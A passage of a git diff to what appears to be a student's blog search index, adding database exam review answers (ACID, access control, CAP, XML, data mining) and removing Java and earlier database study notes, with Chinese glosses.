+<h3 id="Brieflfly-explain-what-an-ontology-and-a-database-schema-are-and-discuss-one-similarity-between-the-two-（本体论和数据库模式的区别）">Brieflfly explain what an ontology and a database schema are and discuss one similarity between the two.（本体论和数据库模式的区别）</h3>
+<ul>
+<li>An ontology is a model that clarifies and specifies a set of meanings in a formal language. Those meanings reflect the ontologist’s understanding of the target subject matter, regarding the kinds of things there are and how those things are related to each other.</li>
+<li>A database schema defines the structure of a database in a formal language. There are three kinds of database schemas: conceptual, logical and physical.</li>
+<li>The fundamental similarity between an ontology and a database schema is that, at the conceptual level, both consist of set of type definitions expressed in a formal notation.</li>
+</ul>
+<h3 id="Discuss-insertion-deletion-and-modification-anomalies-Why-are-they-considered-bad-（插入，删除，修改异常为什么认为是不好的）">Discuss insertion, deletion, and modification anomalies. Why are they considered bad?（插入，删除，修改异常为什么认为是不好的）</h3>
+<ul>
+<li>Anomalies are considered to be bad in the sense that they create dirty data that would be incomplete and inconsistent.</li>
+<li>Moreover, improper insertion, deletion, or update operations will violate the integrity properties.</li>
+<li>Thus, the entire database would be inconsistent.</li>
+</ul>
+<h3 id="Discuss-the-problem-of-spurious-tuples-and-how-we-may-prevent-it-（伪元组）">Discuss the problem of spurious tuples and how we may prevent it.（伪元组）</h3>
+<ul>
+<li>A spurious tuple is mainly a record in a database that gets created while two tables are joined badly.</li>
+<li>In a database, spurious tuples are formed while two tables are joined on attributes which are neither primary nor foreign keys. To prevent spurious tuples, avoid joining relations that consist of matching attributes that are not primary or foreign key combinations as joining on such attributes may generate spurious tuples.</li>
+</ul>
+<h3 id="Why-should-NULLs-in-a-relation-be-avoided-as-much-as-possible">Why should NULLs in a relation be avoided as much as possible?</h3>
+<ul>
+<li>NULLs should be avoided to avoid complexity in SELECT and UPDATE queries.</li>
+<li>Furthermore, columns which have constraints like primary or foreign key constraints cannot contain a NULL value.</li>
+</ul>
+<h3 id="What-is-meant-by-granting-a-privilege-What-is-meant-by-revoking-a-privilege-（给予和撤销权限）">What is meant by granting a privilege? What is meant by revoking a privilege?（给予和撤销权限）</h3>
+<ul>
+<li>Granting and revoking privileges is a task that you would perform when you want to allow or disallow users of the database to be able to reference data within the database as part of a security practice.</li>
+<li>The GRANT privilege statement grants privileges on the database as a whole or on individual tables, views, sequences or procedures.</li>
+<li>It controls access to database objects, roles and DBMS resources. The REVOKE statement revokes privileges. It removes database privileges or role access granted to the specified users, groups, role or PUBLIC.</li>
+<li>You cannot revoke privileges granted by other users.</li>
+</ul>
+<h3 id="What-is-the-difference-between-discretionary-and-mandatory-access-control-（自由权限和强制权限）">What is the difference between discretionary and mandatory access control?（自由权限和强制权限）</h3>
+<ul>
+<li>In mandatory access control, the system and not the users, determines which subjects can access specific data objects.</li>
+<li>Discretionary access control is different from mandatory access control because the owner of the data object specifies which subjects can access the data object.</li>
+</ul>
+<h3 id="What-is-meant-by-row-level-access-control-（行级权限控制）">What is meant by row-level access control?（行级权限控制）</h3>
+<ul>
+<li>Row level access control refers to the practice of controlling access to data in a database by row, so that users are only able to access the data they are authorized for.</li>
+<li>This contrasts with database-level or table-level access control, which controls access to entire databases or tables, respectively.</li>
+</ul>
+<h3 id="Discuss-the-atomicity-durability-isolation-and-consistency-preservation-properties-of-a-database-transaction-（原子性，持久性，隔离性，一致性）">Discuss the atomicity, durability, isolation, and consistency preservation properties of a database transaction.（原子性，持久性，隔离性，一致性）</h3>
+<ul>
+<li>Atomicity is a property that ensures that a database follows the all or nothing rule.  In other words, the database considers all transaction operations as one whole unit or atom.</li>
+<li>Consistency is a property ensuring that only valid data following all rules and constraints is written in the database.  When a transaction results in invalid data, the database reverts to its previous state, which abides by all customary rules and constraints.</li>
+<li>Isolation is a property that guarantees the individuality of each transaction, and prevents them from being affected from other transactions. It ensures that transactions are securely and independently processed at the same time without interference, but it does not ensure the order of transactions.</li>
+<li>Durability is a property that enforces completed transactions, guaranteeing that once each one of them has been committed, it will remain in the system even in case of subsequent failures. These failures include transaction failures and catastrophic failures.</li>
+</ul>
+<h3 id="What-is-a-serial-schedule-What-is-a-serialisable-schedule-Why-is-a-serial-schedule-considered-correct-Why-is-a-serialisable-schedule-considered-correct-（串行调度和可串行调度）">What is a serial schedule? What is a serialisable schedule? Why is a serial schedule considered correct? Why is a serialisable schedule considered correct?（串行调度和可串行调度）</h3>
+<ul>
+<li>A serial schedule is a type of schedule where one transaction is executed completely before starting another transaction. A serial schedule always gives the correct result. Consider two transactions <em>T</em>1 and <em>T</em>2 which perform some operations. If it has no interleaving of operations, then there are two possible outcomes: either execute all of <em>T</em>1 operations, which were followed by <em>T</em>2 operations.</li>
+<li>A serialisable schedule is a non-schedule serial that can be converted to its equivalent serial schedule. In other words, if a non-serial schedule and a serial schedule result in the same, then the non-serial schedule is called a serialisable schedule. A serialisable schedule is accepted as correct because the database is not influenced by the concurrent execution of the transactions.（数据库不受并发事务的影响）</li>
+</ul>
+<h3 id="Discuss-the-actions-taken-by-the-read-item-modify-item-and-write-item-operations-on-a-database">Discuss the actions taken by the <em>read_item</em>, <em>modify_item</em> and <em>write_item</em> operations on a database.</h3>
+<ul>
+<li>The <em>read item</em> operation reads a data item from storage to main memory. The <em>modify item</em> operation changes the value of item in the main memory. The <em>write item</em> operation writes the modified value from main memory to storage.</li>
+</ul>
+<h3 id="Define-the-violations-caused-by-each-of-the-following-a-dirty-read-and-b-phantoms-（脏读取和幻象）">Define the violations caused by each of the following: (a) dirty read, and (b) phantoms.（脏读取和幻象）</h3>
+<ul>
+<li>A dirty read occurs if one transaction reads data that has been modified by another transaction. [<strong>1 mark</strong>] This results in a violation of transaction isolation, if the transaction that modified the data is rolled back. [<strong>1 mark</strong>] A phantom read occurs when a transaction retrieves a set of rows twice [<strong>1 mark</strong>] and new rows are inserted or removed from that set by another transaction that is committed in between. [<strong>1 mark</strong>]</li>
+</ul>
+<h3 id="Describe-two-differences-between-primary-and-secondary-storage-（一次存储和二次存储）">Describe two differences between primary and secondary storage. （一次存储和二次存储）</h3>
+<ul>
+<li>Primary storage is the computer’s main memory and stores data temporarily. Secondary storage is external memory and saves data permanently. Data stored in primary storage can be directly accessed by the CPU, which cannot be accessed in secondary storage.</li>
+</ul>
+<h3 id="Explain-two-techniques-for-allocating-file-blocks-on-a-disk-in-detail-（磁盘分配文件块）">Explain two techniques for allocating file blocks on a disk in detail.（磁盘分配文件块）</h3>
+<ul>
+<li>contiguous file allocation and linked file allocation. （连续文件分配和链接文件分配）</li>
+<li>In contiguous file allocation, the block is allocated in such a manner that all the allocated blocks in the hard disk are adjacent. [<strong>1 mark</strong>] Assuming a file needs <em>n</em> number of blocks in the disk and the file begins with a block at position <em>x</em>, the next blocks to be assigned to it will be <em>x</em> + 1, <em>x</em> + 2, <em>x</em> + 3, …, <em>x</em> + <em>n</em>–1 so that they are in a contiguous manner.</li>
+<li>In linked file allocation, the file which we store on the hard disk is stored in a scattered manner according to the space available on the hard disk. [<strong>1 mark</strong>] To remember the blocks that belong to the same file, the linked file allocation technique uses pointers to point to the next block of the same file. [<strong>1 mark</strong>] Therefore, along with the entry of each file each block also stores the pointer to the next block.</li>
+</ul>
+<h3 id="Explain-how-double-buffering-improves-block-access-time-（双缓冲提高访问时间）">Explain how double buffering improves block access time. （双缓冲提高访问时间）</h3>
+<ul>
+<li>With double buffers, when the CPU is processing the current block of data in buffer 1 [<strong>1 mark</strong>], it can also retrieve the next block into buffer 2 at the same time. When processing of buffer 1 is done, the CPU can then move on to the next block in buffer 2 immediately without waiting.</li>
+</ul>
+<h3 id="What-is-label-security-How-does-an-administrator-enforce-it-（标签安全，管理员如何管理）">What is label security? How does an administrator enforce it?（标签安全，管理员如何管理）</h3>
+<ul>
+<li>Rows of data are labelled to indicate the level and nature of their sensitivity. A label on a row of data specifies the sensitivity of the information in the row and explicitly defines the criteria that must be met for a user to access that row.</li>
+<li>Create the label security policy container.（标签安全策略容器）</li>
+<li>Create data labels for the label security policy. （创建数据标签）</li>
+<li>Authorise users for the label security policy.（授权用户）</li>
+<li>Grant privileges to users and trusted stored program units.（给予权限）</li>
+</ul>
+<h3 id="What-is-flow-control-as-a-security-measure-What-types-of-flow-control-exists-（流量控制类型，作用）">What is flow control as a security measure? What types of flow control exists?（流量控制类型，作用）</h3>
+<ul>
+<li>Flow controls, most commonly, use a concept of security classes, where transmission of data is blocked if the receiver has a security level lower than the sender. There are two types of flow control:</li>
+<li>Explicit flows, consequences of assignments.（显示流量控制）</li>
+<li>Implicit flows, generated by conditions.（隐式流量控制）</li>
+</ul>
+<h3 id="Discuss-three-types-of-arrays-in-PHP-（php中的数组）">Discuss three types of arrays in PHP.（php中的数组）</h3>
+<ul>
+<li>An array in PHP is actually an ordered map. A map is a type that associates values to keys.    This type is optimised for several difference users; it can be treated as an array, a list, a hash table, a dictionary, etc. In PHP, the three types of arrays are: (a) indexed arrays, (b) associative arrays, and © multidimensional arrays. （索引数组，关联数组，多维数组）</li>
+<li>An indexed array is an array with a numeric key. It stores each array element with a numeric index.</li>
+<li>An associative array is an array where each key has its own specific value. The keys assigned to values can be arbitrary and user defined strings.</li>
+<li>A multidimensional array is an array containing one or more arrays within itself. Each element in the array can also be an array and each element in the sub-array can be an array or further contain array within itself.</li>
+</ul>
+<h3 id="What-are-PHP-auto-global-variables-（自动全局变量）">What are PHP auto-global-variables?（自动全局变量）</h3>
+<ul>
+<li>PHP auto-global-variables are built-in variables that are always available in all scopes.   Some predefined variables in PHP are super globals, which means that they are always accessible, regardless of scope, and you can access them from any function, class or file without having to do anything special.</li>
+</ul>
+<h3 id="What-is-the-CAP-theorem-Which-of-the-three-properties-consistency-availability-partition-tolerance-are-most-important-in-NoSQL-systems-（一致性，可用性和分区容错性）">What is the CAP theorem? Which of the three properties (consistency, availability, partition tolerance) are most important in NoSQL systems?（一致性，可用性和分区容错性）</h3>
+<ul>
+<li>In theoretical computer science, the CAP theorem states that any distributed data store can provide only two of the following three guarantees: consistency, availability, and partition tolerance. Consistency guarantees that every read receives the most recent write or an error. Availability guarantees that every request receives a non-error response, without the guarantee that it contains the most recent write. Partition tolerance guarantees that the system continues to operate despite an arbitrary number of messages being dropped or delayed by the network between nodes.</li>
+<li>In a networked NoSQL system, partition tolerance is a must. Network partitions and dropped or delayed messages are a fact in these networked shared-data systems and it must be handled appropriately. [<strong>1 mark</strong>] Consequently, system designers must choose between consistency and availability. A NoSQL system that prioritises availability over consistency can respond with possibly stale data. [<strong>1 mark</strong>] In contrast, a NoSQL system that prioritises consistency over availability can respond with the latest updated data. The system can be distributed across multiple servers and is designed to operate reliably even in the presence of network partitions. [<strong>1 mark</strong>] So, the partition tolerance and consistency properties are most important in NoSQL systems that require immediate consistency.</li>
+</ul>
+<h3 id="What-are-the-similarities-and-differences-between-consistency-in-CAP-versus-consistency-in-ACID">What are the similarities and differences between consistency in CAP versus consistency in ACID</h3>
+<h3 id="What-are-the-differences-between-structured-semi-structured-and-unstructured-data-（结构化数据和非结果化数据）">What are the differences between structured, semi-structured and unstructured data?（结构化数据和非结果化数据）</h3>
+<ul>
+<li>Structured data can be displayed in rows, columns and relational databases. Unstructured data cannot be displayed in rows, columns and relational databases.</li>
+<li>Structured data is comprised of numbers, dates and strings. Unstructured data is comprised of images, audio, video, word processing files, emails, spreadsheets, etc.</li>
+<li>In contrast to structured data, which requires less storage, unstructured data requires more storage. Also, it is more difficult to manage and protect unstructured data with legacy solutions.</li>
+<li>Semi-structured data is information that doesn’t consist of structured data but still has some structure to it. It includes key-value stores and graph databases.</li>
+</ul>
+<h3 id="What-are-the-differences-between-the-use-of-tags-in-XML-versus-HTML-（html和xml的标签区别）">What are the differences between the use of tags in XML versus HTML?（html和xml的标签区别）</h3>
+<ul>
+<li>XML provides namespaces support while HTML does not provide namespaces support. XML namespaces provide a method to avoid element name conflicts.</li>
+<li>In contrast to HTML tags, which are used for displaying data, XML tags are used for describing data not displaying it.</li>
+</ul>
+<h3 id="What-is-the-difference-between-XML-schema-and-XML-DTD-（xml模式和文档类型描述符）">What is the difference between XML schema and XML DTD? （xml模式和文档类型描述符）</h3>
+<ul>
+<li>DTD stands for Document Type Definition. [<strong>1 mark</strong>] A DTD defines the structure and the legal elements and attributes of an XML document. [<strong>1 mark</strong>] DTD is the predecessor of XML schema. [<strong>1 mark</strong>] While DTD provides the basic structure and grammar for defining a XML document, in addition to that XML schema provides methods to define constraints on the data contained in the document. [<strong>2 marks</strong>] Therefore, XML schema is considered to be richer and more powerful than DTD.</li>
+</ul>
+<h3 id="What-are-the-differences-between-row-level-and-statement-level-active-trigger-（行级触发器和语句触发器）">What are the differences between row-level and statement-level active trigger?（行级触发器和语句触发器）</h3>
+<ul>
+<li>Row level triggers execute once for each and every row in the transaction. In contrast, statement level triggers execute only once for each single transaction.</li>
+<li>Row level triggers are specifically used for data handling purposes. In contrast, statement level trigger are used for enforcing all additional security on the transactions performed on the table.</li>
+<li>For example, if 200 rows are to be inserted into a table, the row level trigger would execute 200 times. In contrast, if 200 rows are to be inserted into a table, a statement level trigger would only execute once.</li>
+</ul>
+<h3 id="How-does-clustering-differ-from-classification-（聚类和分类）">How does clustering differ from classification?（聚类和分类）</h3>
+<ul>
+<li>Classification is a supervised machine learning approach where a specific label is provided to the machine learning model to classify new observations. In contrast to classification, clustering is an unsupervised machine learning approach where no specific labels are available in the dataset and grouping is performed on similarities basis.</li>
+</ul>
+<h3 id="What-are-the-difficulties-of-mining-association-rules-from-large-databases-（从大型数据库挖掘关联规则）">What are the difficulties of mining association rules from large databases?（从大型数据库挖掘关联规则）</h3>
+<ul>
+<li>Mining of association rules in large databases is a challenging task. An Apriori algorithm is widely used to find out the frequent itemsets from the database. [<strong>1 mark</strong>] However, it will be inefficient on large databases because it will require more I/O load. Another disadvantage of association rule mining is that they can produce boring rules [<strong>1 mark</strong>], have many discovered rules [<strong>1 mark</strong>], and perform poorly. [<strong>1 mark</strong>]</li>
+</ul>
+]]></content>
+      <categories>
+        <category>大二课程</category>
+      </categories>
+      <tags>
+        <tag>复习</tag>
+        <tag>校内课程</tag>
+        <tag>数据库</tag>
       </tags>
   </entry>
   <entry>
@@ -1403,291 +1716,6 @@
       </tags>
   </entry>
   <entry>
-    <title>大二上java程序设计期末复习</title>
-    <url>/2022/11/29/%E5%A4%A7%E4%BA%8C%E4%B8%8AJava%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>整理了一下ppt的内容，java程序设计课程的课件。</p>
-<h1>软件开发(Software Development)</h1>
-<h2 id="Agile-Methodologies（敏捷方法）">Agile Methodologies（敏捷方法）</h2>
-<p>这是一种快速部署应用程序的理念，优点包括：</p>
-<ul>
-<li>
-<p>persistent software delivery 持续提交软件</p>
-</li>
-<li>
-<p>increased stakeholder satisfaction 增加利益方的满意度</p>
-</li>
-<li>
-<p>inspect and adapt 检查调整</p>
-</li>
-<li>
-<p>welcome to changes at any stage 支持任意阶段修改</p>
-</li>
-<li>
-<p>design is important 设计至关重要</p>
-</li>
-<li>
-<p>daily interaction 日常互动</p>
-</li>
-</ul>
-<h2 id="版本控制（version-control）">版本控制（version control）</h2>
-<p>就是说需要一个git来控制一下版本，对多人合作很方便。而关于这个git的用法可以看看<a href="https://zthlly.github.io/2022/09/13/git%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/">这篇博客</a> 。</p>
-<h2 id="JVM">JVM</h2>
-<p>这里多说两句这个JVM，JVM（Java Virtucal Machine）是一个类似虚拟机的玩意，它运行在操作系统之下，通过与操作系统交互达到与硬件交互的目的。知道这个之后我们看看java文件怎么运行，首先写完一个.java文件之后通过编译器编译得到一个.class文件，然后通过类加载器把这个.class丢到JVM里面。这里再多提两句嘴，JVM内主要的五大块：方法区，堆是线程共享区域，有线程安全问题，栈和本地方法栈和计数器是独享区域，不存在线程安全问题。</p>
-<h1>Java语言基础</h1>
-<h2 id="语言基础语法">语言基础语法</h2>
-<p>这个去<a href="https://zthlly.github.io/2022/07/02/Java%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="si1v3r的狗窝捏">这里</a>看。</p>
-<h2 id="UML图">UML图</h2>
-<p>呃就是一个类的图形化表示，举个例子吧~</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/11/29/b41b30ebbe997a4f.png" alt=""></p>
-<h2 id="递归">递归</h2>
-<ul>
-<li>Mistakes like omitting the base case or writing the recursion step incorrectly can cause infinite recursion. <strong>小心无限递归爆栈</strong></li>
-<li>Recursive programs may result in exponential method calls <strong>递归可能导致指数级别调用</strong></li>
-<li>Each recursive method can be re-written using loops<strong>所有递归可重写为循环</strong></li>
-<li>Use recursive methods only if the problem is naturally recursive (i.e., to improve understanding) or there are performance benefits, or you need to impress in a job interview<strong>在必要的时候再用递归</strong></li>
-</ul>
-<h2 id="Concurrency-in-Java-（并发）">Concurrency in Java （并发）</h2>
-<p>Complex applications may use multithreading to speed up performance or user experience  <strong>复杂的程序会使用多线程来加速性能或用户体验</strong></p>
-<h3 id="Caveats-of-multithreading（多线程注意事项）">Caveats of multithreading（多线程注意事项）</h3>
-<ul>
-<li>Calling methods from multiple threads may have undesired and unexpected side effects (things may not happen in the expected order)   <strong>可能有副作用</strong></li>
-<li>Only primitive variables that are declared <strong>final</strong> can be shared across threads  <strong>只有声明final的变量可以跨线程共享</strong></li>
-<li>Using keyword <strong>synchronized</strong> will “lock” the method execution and force other threads to wait until the execution completes <strong>使用关键字同步将“锁定”方法的执行，并强制其他线程等待，直到执行完成</strong></li>
-<li>Thread can be in different states. After termination, thread can’t be started again (however, you can create a new thread). <strong>线程终止后不能再次启动，但是可以创建一个新的线程</strong></li>
-</ul>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/084e6b23e9a89d42.png" alt=""></p>
-<h2 id="Exception-handling-（异常处理）">Exception handling  （异常处理）</h2>
-<ul>
-<li>An <em>exception</em> is an event, which occurs during the execution of a program, that disrupts the normal flow of the program’s instructions</li>
-<li><strong>Exception handler</strong> is a block of code that can handle the exception</li>
-<li>Java allows to separate exception handling code from the normal code to improve the readability</li>
-<li>Exceptions are propagated across the call stack until exception handler is found so developer can choose at which level exceptions should be handled</li>
-<li>Each organisation will have its own house style on how to write and handle exceptions</li>
-</ul>
-<p>主要层次结构如下：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/06/aab3b03140ebf50d.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>大二课程</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>复习</tag>
-        <tag>校内课程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据库学习</title>
-    <url>/2023/05/21/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<h2 id="Week1">Week1</h2>
-<h3 id="four-main-types-of-actions-involve-databases">four main types of actions involve databases</h3>
-<ul>
-<li><strong>Defining a database</strong>: It includes the data types, structures, and constraints of the data have to store in the database. The database descriptive information is also stored by the DBMS in the form of a database catalog or dictionary; it is called meta-data.</li>
-<li><strong>Constructing the database</strong>: It is the process of data storing on some storage medium that is maintained by the DBMS.</li>
-<li><strong>Manipulating a database</strong>: It includes functions such as retrieve the database by using query, updating the database to reflect changes in the system, and generate reports from the data.</li>
-<li><strong>Sharing a database</strong>: It allows multiple users and programs to access the database simultaneously.</li>
-</ul>
-<h3 id="four-main-characteristics-of-the-database-approach-（四个数据库方法的主要特征）">four main characteristics of the database approach. （四个数据库方法的主要特征）</h3>
-<ul>
-<li>self-describing nature of a database system（自描述性质）</li>
-<li>insulation between programs and data（程序和数据间的隔离）</li>
-<li>data abstraction（数据抽象）</li>
-<li>support of multiple views of the data. （支持数据的多个视图）</li>
-</ul>
-<h3 id="The-differences-between-controlled-and-uncontrolled-redundancy（受控冗余和不受控冗余）">The differences between controlled and uncontrolled redundancy（受控冗余和不受控冗余）</h3>
-<p>Redundancy is the state of being not or no longer needed or useful. Uncontrolled redundancy in storing the same data or information many times in the database leads to several problems including duplication of effort, wastage of storage space and inconsistent data. Controlled redundancy is a technique to use redundant fields in a database. This speed up the database access and also improves the performance of queries. Usually, the DBMS ensures the allocation of the data in the records. It should have the capability to control this redundancy in order to prohibit inconsistencies among the files.</p>
-<h2 id="Week2">Week2</h2>
-<h3 id="differences-between-a-database-schema-and-a-database-state-（数据库模式和数据库状态的区别）">differences between a database schema and a database state. （数据库模式和数据库状态的区别）</h3>
-<p>A database schema represents the overall design of the database. In contrast, the database state represents the current state of data in the database. The database schema is changed occasionally. The database state is changed frequently. Initially when defining a database, only thedatabase schema is specified. The database state is the empty state when the database is defined.</p>
-<p><strong>answer:</strong></p>
-<ul>
-<li>A database schema represents the overall design of the database. In contrast, the database state represents the current state of data in the database.</li>
-<li>The database schema is changed occasionally. In contrast, the database state is changed frequently.</li>
-<li>Initially when defining a database, only the database schema is specified. The database state is the empty state when the database is defined.</li>
-</ul>
-<h3 id="differences-between-logical-data-independence-and-physical-data-independence-（逻辑数据独立性和物理数据独立性区别）">differences between logical data independence and physical data independence. （逻辑数据独立性和物理数据独立性区别）</h3>
-<p>Logical data independence is mainly concerned about the structure or the changing data definition. In contrast, physical data independence is mainly concerned about how the data is stored on the system. Any changes made at the logical level require a change at the application level. In contrast, any changes made at the physical level need not be made at the application level. The conceptual schema is the primary concern in achieving logical data independence. In contrast, the internal schema is the primary concern in achieving physical data independence. Achieving physical data independence is much easier as compared to logical data independence. In contrast, achieving logical data independence is more difficult as compared to physical data independence.</p>
-<h3 id="Why-logical-data-independence-is-harder-to-achieve-compared-to-physical-data-independence">Why logical data independence is harder to achieve compared to physical data independence?</h3>
-<p>Logical data independence is harder to achieve as the application programs are heavily dependent on the logical format of the data they access. Hence, a change at the conceptual level might require changing the entire program application. When it comes to physical data independence, a change in the location of the database or modifying the file organisation or use of new storage devices will not require change at the higher logical levels.</p>
-<p><strong>Answer:</strong></p>
-<ul>
-<li>Logical data independence is harder to achieve as the application programs are heavily dependent on the logical format of the data they access</li>
-<li>Hence, a change at the conceptual level might require changing the entire program application.</li>
-<li>When it comes to physical data independence, a change in the location of the database or modifying the file organisation or use of new storage devices will not require change at the higher logical levels.</li>
-</ul>
-<h3 id="procedural-and-non-procedural-data-manipulation-languages-（程序性数据操作语言和非程序性操作语言）">procedural and non-procedural data manipulation languages.（程序性数据操作语言和非程序性操作语言）</h3>
-<ul>
-<li>In terms of the mode of operation of a procedural DML, a programmer needs to provide a sequential set of instructions regarding what the system needs to perform and how it needs to perform them In contrast, a programmer only needs to provide the information regarding what the system need to d and not how to do it when using a non-procedural DML.</li>
-<li>In terms of language driving, a procedural DML is a command-driven kind of programming language. In contrast, a non-procedural DML is a function-kind of programming language.</li>
-<li>In terms of the approach, a procedural DML is mainly aimed at solving a particular set of available problems. In contrast, a non-procedural DML is a domain-specific type of language.</li>
-<li>In terms of dependency, a procedural DML mainly depends on the execution order. In contrast, a non procedural DML mainly depends on the parameter’s values from the given function.</li>
-<li>In terms of writing of language, a procedural DML is written in the form of a set of the required instructions. In contrast, a non-procedural DML is written in the form of natural instructions of a language.</li>
-</ul>
-<h2 id="Week3">Week3</h2>
-<h3 id="two-cases-where-use-of-a-NULL-value-would-be-appropriate">two cases where use of a NULL value would be appropriate.</h3>
-<p>Setting a NULL value is appropriate when the actual value is <strong>unknown</strong>, or when <strong>a value would not be meaningful</strong>.</p>
-<h3 id="the-differences-among-an-entity-an-entity-type-and-an-entity-set-（实体，实体类型，实体集合）">the differences among an entity, an entity type, and an entity set. （实体，实体类型，实体集合）</h3>
-<p>An entity is a thing in the real world with independent existence. An entity type is a category of a particular entity. An entity set is the set of all entities of a particular entity type.</p>
-<h3 id="differences-between-an-attribute-and-a-value-set-属性和值集的区别">differences between an attribute and a value set (属性和值集的区别)</h3>
-<p>Attributes describe the instances in the row of a database. For example, attributes in an invoice can be price, invoice number and date. A value set specifies the set of values that may be assigned to that attribute for each individual entity.</p>
-<h3 id="two-conditions-where-an-attribute-of-a-binary-relationship-type-can-be-migrated-to-become-an-attribute-of-one-of-the-participating-entity-types">two conditions where an attribute of a binary relationship type can be migrated to become an attribute of one of the participating entity types.</h3>
-<p>The attributes of 1:1 or 1:N relationship types can be migrated to one of the participating entity types. In case of 1:1 cardinality, attributes can be moved to either of entity types in binary relationship. In case of 1:N cardinality, attributes can be migrated only to N side of relationship. In both 1:1 and I:N relationship types, the decision as to where a relationship attribute should be placed – as a relationship type attribute or as an attribute of a participating entity type – is determined subjectively by the schema designer. For relationship types with cardinality M:N, attributes cannot be migrated to become attributes of one of participating entity types.</p>
-<h3 id="two-examples-of-recursive-relationship-types-（递归关系类型）">two examples of recursive relationship types.（递归关系类型）</h3>
-<p>The first example of a recursive relationship type is the supervisor employee relationship. An employee can supervise multiple employees. Hence, it is a recursive relationship of entity EMPLOYEE with itself. This is a one-to-many recursive relationship as one employee supervises many employees. The second example of a recursive relationship type is the class leader and students. A student can be a class leader and handle other students but a person who is working as a class leader is itself a student of the class. Hence, a class leader has a recursive relationship of entity STUDENT with itself.</p>
-<h2 id="Week16">Week16</h2>
-<h3 id="SQL">SQL</h3>
-<p>SQL is a very large and powerful language, but every type of SQL statement falls withinone of three main categories (or sub-languages):</p>
-<p>• <strong>Data Definition Language</strong> (DDL) for creating a DB<br>
-CREATE , DROP , ALTER</p>
-<p>• <strong>Data Control Language</strong> (DCL) for administering a DB<br>
-GRANT , DENY , USE</p>
-<p>• <strong>Data Manipulation Language</strong> (DML) to access a DB<br>
-SELECT , INSERT , UPDATE , DELETE</p>
-<h3 id="Brieflfly-explain-what-an-ontology-and-a-database-schema-are-and-discuss-one-similarity-between-the-two-（本体论和数据库模式的区别）">Brieflfly explain what an ontology and a database schema are and discuss one similarity between the two.（本体论和数据库模式的区别）</h3>
-<ul>
-<li>An ontology is a model that clarifies and specifies a set of meanings in a formal language. Those meanings reflect the ontologist’s understanding of the target subject matter, regarding the kinds of things there are and how those things are related to each other.</li>
-<li>A database schema defines the structure of a database in a formal language. There are three kinds of database schemas: conceptual, logical and physical.</li>
-<li>The fundamental similarity between an ontology and a database schema is that, at the conceptual level, both consist of set of type definitions expressed in a formal notation.</li>
-</ul>
-<h3 id="Discuss-insertion-deletion-and-modification-anomalies-Why-are-they-considered-bad-（插入，删除，修改异常为什么认为是不好的）">Discuss insertion, deletion, and modification anomalies. Why are they considered bad?（插入，删除，修改异常为什么认为是不好的）</h3>
-<ul>
-<li>Anomalies are considered to be bad in the sense that they create dirty data that would be incomplete and inconsistent.</li>
-<li>Moreover, improper insertion, deletion, or update operations will violate the integrity properties.</li>
-<li>Thus, the entire database would be inconsistent.</li>
-</ul>
-<h3 id="Discuss-the-problem-of-spurious-tuples-and-how-we-may-prevent-it-（伪元组）">Discuss the problem of spurious tuples and how we may prevent it.（伪元组）</h3>
-<ul>
-<li>A spurious tuple is mainly a record in a database that gets created while two tables are joined badly.</li>
-<li>In a database, spurious tuples are formed while two tables are joined on attributes which are neither primary nor foreign keys. To prevent spurious tuples, avoid joining relations that consist of matching attributes that are not primary or foreign key combinations as joining on such attributes may generate spurious tuples.</li>
-</ul>
-<h3 id="Why-should-NULLs-in-a-relation-be-avoided-as-much-as-possible">Why should NULLs in a relation be avoided as much as possible?</h3>
-<ul>
-<li>NULLs should be avoided to avoid complexity in SELECT and UPDATE queries.</li>
-<li>Furthermore, columns which have constraints like primary or foreign key constraints cannot contain a NULL value.</li>
-</ul>
-<h3 id="What-is-meant-by-granting-a-privilege-What-is-meant-by-revoking-a-privilege-（给予和撤销权限）">What is meant by granting a privilege? What is meant by revoking a privilege?（给予和撤销权限）</h3>
-<ul>
-<li>Granting and revoking privileges is a task that you would perform when you want to allow or disallow users of the database to be able to reference data within the database as part of a security practice.</li>
-<li>The GRANT privilege statement grants privileges on the database as a whole or on individual tables, views, sequences or procedures.</li>
-<li>It controls access to database objects, roles and DBMS resources. The REVOKE statement revokes privileges. It removes database privileges or role access granted to the specified users, groups, role or PUBLIC.</li>
-<li>You cannot revoke privileges granted by other users.</li>
-</ul>
-<h3 id="What-is-the-difference-between-discretionary-and-mandatory-access-control-（自由权限和强制权限）">What is the difference between discretionary and mandatory access control?（自由权限和强制权限）</h3>
-<ul>
-<li>In mandatory access control, the system and not the users, determines which subjects can access specific data objects.</li>
-<li>Discretionary access control is different from mandatory access control because the owner of the data object specifies which subjects can access the data object.</li>
-</ul>
-<h3 id="What-is-meant-by-row-level-access-control-（行级权限控制）">What is meant by row-level access control?（行级权限控制）</h3>
-<ul>
-<li>Row level access control refers to the practice of controlling access to data in a database by row, so that users are only able to access the data they are authorized for.</li>
-<li>This contrasts with database-level or table-level access control, which controls access to entire databases or tables, respectively.</li>
-</ul>
-<h3 id="Discuss-the-atomicity-durability-isolation-and-consistency-preservation-properties-of-a-database-transaction-（原子性，持久性，隔离性，一致性）">Discuss the atomicity, durability, isolation, and consistency preservation properties of a database transaction.（原子性，持久性，隔离性，一致性）</h3>
-<ul>
-<li>Atomicity is a property that ensures that a database follows the all or nothing rule.  In other words, the database considers all transaction operations as one whole unit or atom.</li>
-<li>Consistency is a property ensuring that only valid data following all rules and constraints is written in the database.  When a transaction results in invalid data, the database reverts to its previous state, which abides by all customary rules and constraints.</li>
-<li>Isolation is a property that guarantees the individuality of each transaction, and prevents them from being affected from other transactions. It ensures that transactions are securely and independently processed at the same time without interference, but it does not ensure the order of transactions.</li>
-<li>Durability is a property that enforces completed transactions, guaranteeing that once each one of them has been committed, it will remain in the system even in case of subsequent failures. These failures include transaction failures and catastrophic failures.</li>
-</ul>
